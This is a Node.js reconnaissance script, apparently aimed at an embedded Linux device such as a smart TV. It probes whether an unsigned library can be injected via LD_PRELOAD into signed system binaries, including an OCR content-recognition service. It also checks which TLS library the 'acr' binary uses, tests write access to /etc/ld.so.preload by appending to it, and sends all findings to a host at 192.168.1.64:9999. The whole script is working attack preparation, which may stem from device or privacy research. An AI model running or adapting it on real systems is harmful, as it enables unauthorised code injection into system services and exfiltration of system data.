"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { res.resume(); console.log("posted " + path + " " + res.statusCode); });
    req.on("error", function (e) { console.log("post err " + path + " " + e.message); });
    req.write(data);
    req.end();
}

function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 15000 }).slice(0, cap || 8000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();

var SO = "/home/owner/share/tmp/sdk_tools/tee_probe.so";

// 1. UEP test: does an unsigned .so load via LD_PRELOAD into a signed binary?
sh("rm -f /opt/usr/tee_probe_loaded");
out.ldpreload_sh = sh("LD_PRELOAD=" + SO + " /bin/sh -c 'echo ran' ");
out.marker_after_sh = sh("ls -la /opt/usr/tee_probe_loaded 2>&1; cat /opt/usr/tee_probe_loaded 2>&1");

sh("rm -f /opt/usr/tee_probe_loaded");
out.ldpreload_node = sh("LD_PRELOAD=" + SO + " /bin/true");
out.marker_after_true = sh("ls -la /opt/usr/tee_probe_loaded 2>&1");

// 2. same but for the actual target binaries (they are signed system binaries)
sh("rm -f /opt/usr/tee_probe_loaded");
out.ldpreload_svc = sh("LD_PRELOAD=" + SO + " /usr/bin/contents-recognition-service --help 2>&1 | head -3");
out.marker_after_svc = sh("ls -la /opt/usr/tee_probe_loaded 2>&1");

// 3. link mode of the OCR service (does it link libOCREngine or dlopen it?)
out.svc_link = sh("grep -a -o 'libOCREngine[^[:space:]]*' /usr/bin/contents-recognition-service | head -3; echo ---ldd---; ldd /usr/bin/contents-recognition-service 2>&1 | head -15");
out.svc_dlopen = sh("grep -a -o -E '(dlopen|dlsym|libdl)' /usr/bin/contents-recognition-service | sort | uniq -c | head -8");

// 4. acr: TLS library used for the outbound payload
out.acr_link = sh("grep -a -o -E '(SSL_write|SSL_read|libssl[^[:space:]]*|libcurl[^[:space:]]*|curl_easy|gnutls|openssl)' /usr/bin/acr | sort | uniq -c | head -12; echo ---ldd---; ldd /usr/bin/acr 2>&1 | head -15");

// 5. ld.so.preload writability
out.preload = sh("ls -la /etc/ld.so.preload 2>&1; echo test >> /etc/ld.so.preload 2>&1 && echo WRITABLE && sed -i '/^test$/d' /etc/ld.so.preload || echo NOTWRITABLE");

// 6. systemd restart available?
out.systemctl = sh("which systemctl; systemctl status contents-recognition-service 2>&1 | head -6");

post("/ocr_recon2", out);
post("/ocr_recon2_done", { started: out.started });
